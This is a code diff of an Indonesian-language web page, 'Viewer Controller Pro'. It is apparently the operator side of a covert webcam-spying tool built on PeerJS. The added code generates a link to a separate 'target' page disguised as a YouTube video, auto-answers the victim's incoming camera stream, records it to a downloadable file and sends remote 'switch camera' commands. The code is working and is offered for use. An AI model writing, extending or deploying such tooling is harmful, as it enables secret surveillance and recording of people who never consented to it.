@@ -3,44 +3,64 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Viewer Controller</title>
+    <title>Viewer Controller Pro</title>
     <style>
-        body { font-family: sans-serif; background: #1a1a1a; color: white; padding: 20px; }
-        .container { max-width: 1000px; margin: 0 auto; background: #222; padding: 20px; border-radius: 15px; }
-        .video-box { width: 100%; aspect-ratio: 16/9; background: #000; border-radius: 10px; margin: 20px 0; position: relative; overflow: hidden; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #121212; color: white; padding: 20px; }
+        .container { max-width: 1000px; margin: 0 auto; background: #1e1e1e; padding: 25px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .video-box { width: 100%; aspect-ratio: 16/9; background: #000; border-radius: 15px; margin: 20px 0; position: relative; overflow: hidden; border: 2px solid #333; }
         video { width: 100%; height: 100%; object-fit: cover; }
-        .status { padding: 10px; background: #333; border-radius: 5px; margin-bottom: 10px; display: flex; align-items: center; gap: 10px; }
-        .dot { width: 10px; height: 10px; border-radius: 50%; background: red; }
-        .dot.active { background: #00ff00; box-shadow: 0 0 10px #00ff00; }
-        .controls { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-        button { padding: 15px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; background: #444; color: white; }
-        #btnStart { background: #00b09b; }
-        #linkBox { background: #111; padding: 10px; border-radius: 5px; font-family: monospace; font-size: 12px; margin-top: 10px; word-break: break-all; }
+        .status { padding: 12px 20px; background: #2d2d2d; border-radius: 10px; margin-bottom: 20px; display: flex; align-items: center; gap: 15px; border-left: 5px solid #ff4444; }
+        .status.active { border-left-color: #00ff00; }
+        .dot { width: 12px; height: 12px; border-radius: 50%; background: #ff4444; }
+        .dot.active { background: #00ff00; box-shadow: 0 0 10px #00ff00; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+        
+        .controls { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px; margin-bottom: 20px; }
+        button { padding: 15px; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; transition: 0.3s; font-size: 14px; display: flex; align-items: center; justify-content: center; gap: 8px; }
+        #btnStart { background: #00b09b; color: white; }
+        #btnRecord { background: #ff416c; color: white; }
+        #btnRecord.recording { animation: blink 1s infinite; }
+        @keyframes blink { 50% { opacity: 0.6; } }
+        #btnSwitch { background: #4776E6; color: white; }
+        #btnCopy { background: #f9d423; color: #333; }
+        button:disabled { opacity: 0.5; cursor: not-allowed; }
+        
+        .input-group { background: #2d2d2d; padding: 15px; border-radius: 10px; margin-top: 20px; }
+        input { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #444; background: #1a1a1a; color: white; margin-top: 10px; outline: none; }
+        #linkBox { background: #111; padding: 15px; border-radius: 8px; font-family: monospace; font-size: 13px; margin-top: 10px; word-break: break-all; color: #00ff00; border: 1px dashed #444; }
+        .badge { background: rgba(255,255,255,0.1); padding: 4px 8px; border-radius: 4px; font-size: 11px; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h2>🎥 Remote Viewer</h2>
-        <div class="status">
+        <h2 style="margin-bottom: 20px;">🎮 Remote Camera Controller</h2>
+        
+        <div class="status" id="statusContainer">
             <div id="statusDot" class="dot"></div>
-            <span id="statusText">Menunggu Koneksi...</span>
+            <span id="statusText">Viewer belum aktif</span>
         </div>
 
         <div class="controls">
-            <button id="btnStart">MULAI VIEWER</button>
-            <button id="btnCopy">SALIN LINK</button>
+            <button id="btnStart">🚀 MULAI VIEWER</button>
+            <button id="btnRecord" disabled>🔴 REKAM STREAM</button>
+            <button id="btnSwitch" disabled>🔄 GANTI KAMERA</button>
+            <button id="btnCopy" disabled>📋 SALIN LINK</button>
         </div>
-
-        <div id="linkBox" style="display:none"></div>
 
         <div class="video-box">
             <video id="remoteVideo" autoplay playsinline muted></video>
-            <div id="noSignal" style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); color:#555">NO SIGNAL</div>
+            <div id="noSignal" style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); color:#555; font-weight:bold;">TIDAK ADA SINYAL</div>
+        </div>
+
+        <div class="input-group">
+            <label>🎬 <strong>Samarkan dengan Video YouTube:</strong></label>
+            <input type="text" id="ytUrl" placeholder="Tempel link YouTube di sini (contoh: https://www.youtube.com/watch?v=dQw4w9WgXcQ)">
+            <div id="linkBox" style="display:none">Link target akan muncul di sini setelah Viewer dimulai</div>
         </div>
         
-        <div style="font-size: 12px; color: #888;">
-            ID Anda: <span id="myId">-</span><br>
-            Target: <span id="targetId">-</span>
+        <div style="margin-top: 20px; display: flex; gap: 20px; color: #888; font-size: 12px;">
+            <div>ID VIEWER: <span id="myId" class="badge">-</span></div>
+            <div>ID TARGET: <span id="targetId" class="badge">-</span></div>
         </div>
     </div>
 
@@ -48,38 +68,66 @@
     <script>
         let peer = null;
         let conn = null;
+        let mediaRecorder = null;
+        let recordedChunks = [];
+        let isRecording = false;
+        let currentViewerId = null;
+
         const remoteVideo = document.getElementById('remoteVideo');
         const statusDot = document.getElementById('statusDot');
         const statusText = document.getElementById('statusText');
+        const statusContainer = document.getElementById('statusContainer');
         const myIdText = document.getElementById('myId');
         const targetIdText = document.getElementById('targetId');
         const linkBox = document.getElementById('linkBox');
+        const ytUrlInput = document.getElementById('ytUrl');
+        
+        const btnStart = document.getElementById('btnStart');
+        const btnRecord = document.getElementById('btnRecord');
+        const btnSwitch = document.getElementById('btnSwitch');
+        const btnCopy = document.getElementById('btnCopy');
+
+        function updateLink() {
+            if (!currentViewerId) return;
+            let videoId = 'dQw4w9WgXcQ'; // Default
+            const urlVal = ytUrlInput.value;
+            if (urlVal) {
+                const match = urlVal.match(/(?:https?:\/\/)?(?:www\.)?(?:youtube\.com\/watch\?v=|youtu\.be\/)([^& \n]+)/);
+                if (match) videoId = match[1];
+            }
+            const baseUrl = window.location.href.replace('viewer-enhanced.html', 'target-enhanced.html');
+            const fullUrl = `${baseUrl}?viewer=${currentViewerId}&v=${videoId}`;
+            linkBox.textContent = fullUrl;
+            linkBox.style.display = 'block';
+        }
+
+        ytUrlInput.addEventListener('input', updateLink);
 
         function initViewer() {
-            const viewerId = "viewer-" + Math.floor(1000 + Math.random() * 9000);
-            peer = new Peer(viewerId, {
+            currentViewerId = "viewer-" + Math.floor(1000 + Math.random() * 9000);
+            peer = new Peer(currentViewerId, {
                 host: '0.peerjs.com', port: 443, secure: true,
                 config: { 'iceServers': [{ 'urls': 'stun:stun.l.google.com:19302' }, { 'urls': 'stun:stun1.l.google.com:19302' }] }
             });
 
             peer.on('open', (id) => {
                 myIdText.textContent = id;
-                const url = window.location.href.replace('viewer-enhanced.html', 'target-enhanced.html') + "?viewer=" + id;
-                linkBox.textContent = url;
-                linkBox.style.display = 'block';
+                updateLink();
                 statusText.textContent = "Siap! Kirim link ke target.";
+                btnCopy.disabled = false;
             });
 
-            // MENERIMA PANGGILAN OTOMATIS
             peer.on('call', (call) => {
-                console.log("Menerima stream...");
                 call.answer();
                 call.on('stream', (stream) => {
                     remoteVideo.srcObject = stream;
                     remoteVideo.play();
                     document.getElementById('noSignal').style.display = 'none';
                     statusDot.classList.add('active');
+                    statusContainer.classList.add('active');
                     statusText.textContent = "STREAMING AKTIF";
+                    btnRecord.disabled = false;
+                    btnSwitch.disabled = false;
                 });
             });
 
@@ -94,15 +142,68 @@
             });
         }
 
-        document.getElementById('btnStart').addEventListener('click', () => {
+        btnStart.addEventListener('click', () => {
             initViewer();
-            document.getElementById('btnStart').disabled = true;
+            btnStart.disabled = true;
+            btnStart.textContent = "VIEWER AKTIF";
         });
 
-        document.getElementById('btnCopy').addEventListener('click', () => {
+        btnCopy.addEventListener('click', () => {
             navigator.clipboard.writeText(linkBox.textContent);
-            alert("Link disalin!");
+            alert("Link penyamaran berhasil disalin!");
         });
+
+        // Fitur Ganti Kamera
+        btnSwitch.addEventListener('click', () => {
+            if (conn && conn.open) {
+                conn.send({ type: 'switch_camera' });
+                statusText.textContent = "Meminta ganti kamera...";
+            }
+        });
+
+        // Fitur Rekam
+        btnRecord.addEventListener('click', () => {
+            if (!isRecording) {
+                startRecording();
+            } else {
+                stopRecording();
+            }
+        });
+
+        function startRecording() {
+            const stream = remoteVideo.srcObject;
+            if (!stream) return;
+            
+            recordedChunks = [];
+            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+            
+            mediaRecorder.ondataavailable = (e) => {
+                if (e.data.size > 0) recordedChunks.push(e.data);
+            };
+            
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `record_${new Date().getTime()}.webm`;
+                a.click();
+            };
+            
+            mediaRecorder.start();
+            isRecording = true;
+            btnRecord.textContent = "⏹️ BERHENTI REKAM";
+            btnRecord.classList.add('recording');
+        }
+
+        function stopRecording() {
+            if (mediaRecorder) {
+                mediaRecorder.stop();
+                isRecording = false;
+                btnRecord.textContent = "🔴 REKAM STREAM";
+                btnRecord.classList.remove('recording');
+            }
+        }
     </script>
 </body>
 </html>
